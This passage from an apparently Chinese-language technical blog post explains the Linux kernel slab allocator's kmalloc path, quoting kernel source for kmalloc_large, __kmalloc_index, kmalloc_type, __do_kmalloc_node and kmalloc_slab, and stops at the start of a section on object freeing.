class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-type">static</span> __always_inline __alloc_size(<span class="hljs-number">1</span>) <span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)<br><span class="hljs-keyword">return</span> kmalloc_large(size, flags);<br><br>index = kmalloc_index(size);<br><span class="hljs-keyword">return</span> kmalloc_trace(<br>kmalloc_caches[kmalloc_type(flags)][index],<br>flags, size);<br>&#125;<br><span class="hljs-keyword">return</span> __kmalloc(size, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-kmalloc-large-ï¼šç›´æ¥å‘-buddy-system-è¯·æ±‚å†…å­˜">I. kmalloc_large()ï¼šç›´æ¥å‘ buddy system è¯·æ±‚å†…å­˜</h3><p>å¯¹äºè¯·æ±‚å¤§å°å¤§äº <code>KMALLOC_MAX_CACHE_SIZE</code> çš„å†…å­˜åˆ†é…è¯·æ±‚è€Œè¨€ï¼Œ <code>kmalloc()</code> ä¼šç›´æ¥è°ƒç”¨ <code>kmalloc_large()</code> å®Œæˆå†…å­˜åˆ†é…ï¼Œæœ€åå®é™…ä¸Šä¼šåœ¨ <code>__kmalloc_large_node()</code> è°ƒç”¨ <code>alloc_pages()</code> å‘ buddy system è¯·æ±‚å†…å­˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¸ºäº†é¿å…ä¸å¿…è¦çš„å¼€é”€,æˆ‘ä»¬å°†å¤§çš„åˆ†é…è¯·æ±‚ç›´æ¥ä¼ é€’ç»™é¡µé¢åˆ†é…å™¨.</span><br><span class="hljs-comment"> * æˆ‘ä»¬ä½¿ç”¨ __GFP_COMP, å› ä¸ºæˆ‘ä»¬éœ€è¦çŸ¥é“åˆ†é…çš„ order ä»¥åœ¨ kfree ä¸­æ°å½“åœ°é‡Šæ”¾.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__kmalloc_large_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = get_order(size);<br><br><span class="hljs-keyword">if</span> (unlikely(flags &amp; GFP_SLAB_BUG_MASK))<br>flags = kmalloc_fix_flags(flags);<br><br>flags |= __GFP_COMP;<br>page = alloc_pages_node(node, flags, order);<br><span class="hljs-keyword">if</span> (page) &#123;<br>ptr = page_address(page);<br>mod_lruvec_page_state(page, NR_SLAB_UNRECLAIMABLE_B,<br>      PAGE_SIZE &lt;&lt; order);<br>&#125;<br><br>ptr = kasan_kmalloc_large(ptr, size, flags);<br><span class="hljs-comment">/* As ptr might get tagged, call kmemleak hook after KASAN. */</span><br>kmemleak_alloc(ptr, size, <span class="hljs-number">1</span>, flags);<br>kmsan_kmalloc_large(ptr, size, flags);<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_large</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);<br><br>trace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),<br>      flags, NUMA_NO_NODE);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_large);<br></code></pre></td></tr></table></figure><h3 id="II-kmalloc-index-ï¼šè·å–sizeå¯¹åº”ä¸‹æ ‡">II. __kmalloc_index()ï¼šè·å–sizeå¯¹åº”ä¸‹æ ‡</h3><p><code>kmalloc_index()</code> å…¶å®å°±æ˜¯ <code>__kmalloc_indexï¼ˆï¼‰</code>ï¼Œæ ¹æ®è¯·æ±‚çš„å¤§å°è¿”å›å¯¹åº”çš„ä¸‹æ ‡ï¼Œæ•´ä½“é€»è¾‘éå¸¸ç®€å•ç²—æš´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç®—å‡ºä¸€ä¸ªç‰¹å®šå¤§å°çš„åˆ†é…å±äºå“ªä¸ª kmalloc slab .</span><br><span class="hljs-comment"> * 0 = zero alloc</span><br><span class="hljs-comment"> * 1 =  65 .. 96 bytes</span><br><span class="hljs-comment"> * 2 = 129 .. 192 bytes</span><br><span class="hljs-comment"> * n = 2^(n-1)+1 .. 2^n</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ³¨æ„: __kmalloc_index() åœ¨ç¼–è¯‘æœŸä¼˜åŒ–, æ²¡æœ‰è¿è¡Œæ—¶ä¼˜åŒ–;</span><br><span class="hljs-comment"> * å…¸å‹çš„ç”¨æ³•ä¸ºé€šè¿‡ kmalloc_index() ä»¥åœ¨ç¼–è¯‘æœŸä¼˜åŒ–.</span><br><span class="hljs-comment"> * å¤§å°éå¸¸é‡çš„è°ƒç”¨è€…ä»…åº”å½“ä¸º__kmalloc_index()çš„è¿è¡Œæ—¶å¼€é”€å¯ä»¥è¢«æ¥å—çš„æµ‹è¯•æ¨¡å—.</span><br><span class="hljs-comment"> * åŒæ ·å‚è§ kmalloc_slab().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __kmalloc_index(<span class="hljs-type">size_t</span> size,<br>    <span class="hljs-type">bool</span> size_is_constant)<br>&#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)<br><span class="hljs-keyword">return</span> KMALLOC_SHIFT_LOW;<br><br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">32</span> &amp;&amp; size &gt; <span class="hljs-number">64</span> &amp;&amp; size &lt;= <span class="hljs-number">96</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">64</span> &amp;&amp; size &gt; <span class="hljs-number">128</span> &amp;&amp; size &lt;= <span class="hljs-number">192</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (size &lt;=          <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">16</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">32</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">64</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">128</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">7</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">256</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">512</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br><span class="hljs-keyword">if</span> (size &lt;=       <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">2</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">11</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">4</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">8</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">13</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">16</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">14</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">32</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">64</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">16</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">17</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">256</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">18</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">19</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">21</span>;<br><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)<br>BUILD_BUG_ON_MSG(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unexpected size in kmalloc_index()&quot;</span>);<br><span class="hljs-keyword">else</span><br>BUG();<br><br><span class="hljs-comment">/* Will never be reached. Needed because the compiler may complain */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmalloc-types-ï¼šè·å–æ ‡å¿—ä½å¯¹åº”ç±»å‹">III. kmalloc_types()ï¼šè·å–æ ‡å¿—ä½å¯¹åº”ç±»å‹</h3><p><code>kmalloc_type()</code> å…¶å®ä¸»è¦å°±æ˜¯æ ¹æ®æ ‡å¿—ä½è¿”å›ç±»å‹ï¼Œé™¤äº†æŒ‡å®šäº† <code>__GFP_DMA/__GFP_RECLAIMABLE/__GFP_ACCOUNT</code> ä»¥å¤–å°±éƒ½æ˜¯ <code>KMALLOC_NORMAL</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-keyword">enum</span> kmalloc_cache_type <span class="hljs-title function_">kmalloc_type</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æœ€å¸¸è§„çš„æƒ…å†µä¸º KMALLOC_NORMAL, æ‰€ä»¥ç”¨ä¸€ä¸ªå•ç‹¬çš„åˆ†æ”¯æµ‹è¯•æ‰€æœ‰ç›¸å…³çš„æ ‡å¿—ä½.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> KMALLOC_NORMAL;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‡³å°‘éœ€è¦è®¾ç½®ä¸€ç§æ ‡å¿—ä½. ä¼˜å…ˆé¡ºåºä¸º:</span><br><span class="hljs-comment"> *  1) __GFP_DMA</span><br><span class="hljs-comment"> *  2) __GFP_RECLAIMABLE</span><br><span class="hljs-comment"> *  3) __GFP_ACCOUNT</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))<br><span class="hljs-keyword">return</span> KMALLOC_DMA;<br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))<br><span class="hljs-keyword">return</span> KMALLOC_RECLAIM;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> KMALLOC_CGROUP;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IV-kmalloc-trace-ï¼šå¸¸è§„å¤§å°çš„-NUMA-NO-NODE-å¯¹è±¡åˆ†é…">IV. kmalloc_trace()ï¼šå¸¸è§„å¤§å°çš„ NUMA_NO_NODE å¯¹è±¡åˆ†é…</h3><p><code>kmalloc_trace()</code> ä¸»è¦æ˜¯å¯¹ <code>__kmem_cache_alloc_node()</code> çš„ wrapperï¼ŒåŠ ä¸Š tracepoint å’Œ kasan çš„ç›¸å…³è®¾ç½®ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œä¼šæŒ‡å®š node ä¸º <code>NUMA_NO_NODE</code>ï¼š</p><blockquote><p>ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ kernel trace point çš„å¯ä»¥å‚è§ <a href="https://docs.kernel.org/trace/tracepoints.html">è¿™é‡Œ</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_trace</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,<br>    size, _RET_IP_);<br><br>trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);<br><br>ret = kasan_kmalloc(s, ret, size, gfpflags);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_trace);<br></code></pre></td></tr></table></figure><p><code>__kmem_cache_alloc_node()</code> å…¶å®å°±æ˜¯ <code>slab_alloc_node()</code> çš„ wrapperï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmem_cache_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags,<br>      <span class="hljs-type">int</span> node, <span class="hljs-type">size_t</span> orig_size,<br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-keyword">return</span> slab_alloc_node(s, <span class="hljs-literal">NULL</span>, gfpflags, node,<br>       caller, orig_size);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="V-kmalloc-ï¼šå¸¸è§„å¤§å°çš„-NUMA-NO-NODE-å¯¹è±¡åˆ†é…">V. __kmalloc()ï¼šå¸¸è§„å¤§å°çš„ NUMA_NO_NODE å¯¹è±¡åˆ†é…</h3><p><code>__kmalloc()</code> å…¶å®å°±æ˜¯æŒ‡å®š node ä¸º <code> NUMA_NO_NODE</code> çš„ <code>__do_kmalloc_node()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmalloc(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)<br>&#123;<br><span class="hljs-keyword">return</span> __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(__kmalloc);<br></code></pre></td></tr></table></figure><h3 id="VI-do-kmalloc-node-ï¼šåˆ¤æ–­æ‰€éœ€-kmem-cache-å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…">VI. __do_kmalloc_node()ï¼šåˆ¤æ–­æ‰€éœ€ kmem_cache å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…</h3><p>è¯¥å‡½æ•°çš„ä¸»è¦é€»è¾‘ä¸ºï¼š</p><ul><li>è‹¥ <code>size &gt; KMALLOC_MAX_CACHE_SIZE</code> ï¼Œåˆ™è°ƒç”¨ <code>__kmalloc_large_node()</code> è¿›è¡Œåˆ†é…ï¼Œå¹¶è¿›è¡Œ tracepoint ä¸ kasan ç›¸å…³è®¾ç½®</li><li>å¯¹äºå¸¸è§„ sizeï¼š<ul><li>é¦–å…ˆè°ƒç”¨ <code>kmalloc_slab()</code> è·å–å¯¹åº”çš„ <code>kmem_cache</code></li><li>æ¥ä¸‹æ¥è°ƒç”¨ <code>__kmem_cache_alloc_node()</code> è¿›è¡Œå†…å­˜åˆ†é…</li><li>æœ€åè¿›è¡Œ tracepoint ä¸ kasan ç›¸å…³è®¾ç½®</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline<br><span class="hljs-type">void</span> *__do_kmalloc_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><span class="hljs-type">void</span> *ret;<br><br><span class="hljs-keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) &#123;<br>ret = __kmalloc_large_node(size, flags, node);<br>trace_kmalloc(caller, ret, size,<br>      PAGE_SIZE &lt;&lt; get_order(size), flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>s = kmalloc_slab(size, flags);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))<br><span class="hljs-keyword">return</span> s;<br><br>ret = __kmem_cache_alloc_node(s, flags, node, size, caller);<br>ret = kasan_kmalloc(s, ret, size, flags);<br>trace_kmalloc(caller, ret, size, s-&gt;size, flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>kmalloc_slab()</code> ä¸­å¯»æ‰¾ <code>kmem_cache</code> çš„è¿‡ç¨‹å’Œ kmalloc ç±»ä¼¼ï¼Œä¸è¿‡å¯»æ‰¾ä¸‹æ ‡ç”¨çš„æ˜¯ <code>size_index[size_index_elem(size)]</code> å’Œ <code>fls()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¯»æ‰¾æ»¡è¶³ç»™å®šå¤§å°çš„åˆ†é…çš„ kmem_cache ç»“æ„ä½“</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> kmem_cache *<span class="hljs-title function_">kmalloc_slab</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">192</span>) &#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> ZERO_SIZE_PTR;<br><br>index = size_index[size_index_elem(size)];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>index = fls(size - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];<br>&#125;<br></code></pre></td></tr></table></figure><p><code>size_index</code> å’Œ <code>size_index_elem()</code> çš„å®šä¹‰éƒ½éå¸¸ç®€å•ç²—æš´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Conversion table for small slabs sizes / 8 to the index in the</span><br><span class="hljs-comment"> * kmalloc array. This is necessary for slabs &lt; 192 since we have non power</span><br><span class="hljs-comment"> * of two cache sizes there. The size of larger slabs can be determined using</span><br><span class="hljs-comment"> * fls.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> u8 size_index[<span class="hljs-number">24</span>] __ro_after_init = &#123;<br><span class="hljs-number">3</span>,<span class="hljs-comment">/* 8 */</span><br><span class="hljs-number">4</span>,<span class="hljs-comment">/* 16 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 24 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 32 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 40 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 48 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 56 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 64 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 72 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 80 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 88 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 96 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 104 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 112 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 120 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 128 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 136 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 144 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 152 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 160 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 168 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 176 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 184 */</span><br><span class="hljs-number">2</span><span class="hljs-comment">/* 192 */</span><br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_index_elem</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bytes)</span><br>&#123;<br><span class="hljs-keyword">return</span> (bytes - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾">ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾</h2><p>å› ä¸ºå¾ˆå¤šæ¯”å¦‚è¯´ <code>__kmem_cache_alloc_lru()</code> ä¸€ç±»çš„å‡½æ•°å…¶å®æœ€åéƒ½æ˜¯å¯¹ <code>slab_alloc_node()</code> çš„å¥—å¨ƒï¼Œè¿™é‡Œç¬”è€…ç›´æ¥ç»™å‡ºä¸€ä¸ªç®€æ˜“çš„è°ƒç”¨å…³ç³»å›¾ï¼š</p><blockquote><p>åªæˆªå–äº†ç¬”è€…è®¤ä¸ºæ¯”è¾ƒä¸»è¦çš„é‚£äº›ï¼Œ<s>å› ä¸ºä½œå›¾ä½œåˆ°åé¢å®åœ¨èšŒåŸ ä½äº†</s></p></blockquote><p><img src="https://s2.loli.net/2023/02/22/wCchFdIZLOn3m7W.png" alt="image.png"></p><h1>0x03. å¯¹è±¡çš„é‡Šæ”¾</h1><h2 id="â€»-ä¸€ã€do-slab-free-ï¼šå‘æŒ‡å®šçš„-kmem-cache-é‡Šæ”¾å¯¹è±¡ï¼ˆé“¾ï¼‰">â€» ä¸€ã€do_slab_free()ï¼šå‘æŒ‡å®šçš„ kmem_cache é‡Šæ”¾å¯¹è±¡ï¼ˆé“¾ï¼‰</h2><p>åœ¨ slab allocator ä¸­å­˜åœ¨ç€å¤šä¸ªä¸åŒçš„å†…å­˜é‡Šæ”¾æ¥å£ï¼Œå…¶æœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>do_slab_free()</code> å®Œæˆå†…å­˜é‡Šæ”¾çš„å·¥ä½œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥å‡½æ•°  